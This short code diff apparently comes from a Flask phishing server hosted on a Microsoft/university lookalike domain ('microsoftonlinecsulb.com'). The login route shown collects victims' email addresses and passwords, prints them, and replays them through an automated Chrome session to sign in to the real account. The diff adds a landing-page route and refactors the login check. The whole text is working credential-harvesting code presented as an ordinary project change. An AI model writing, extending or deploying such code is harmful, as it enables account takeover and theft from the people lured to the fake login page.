@@ -24,6 +24,10 @@ context = ('/etc/letsencrypt/live/microsoftonlinecsulb.com/cert.pem', '/etc/lets
 def profile():
     return 'Profile'
 
+@app.route("/")
+def change_it():
+    return render_template("index.html")
+
 @app.route('/login', methods=['GET', 'POST'])
 def login():
     # Here we use a class of some kind to represent and validate our
@@ -33,7 +37,8 @@ def login():
     password = request.form.get('password')
     print(email,password)
     chrome = main.startChrome()
-    if chrome.login_email(email,password) == True:
+    var = chrome.login_email(email,password)
+    if var == True:
         #stop loading
        
         
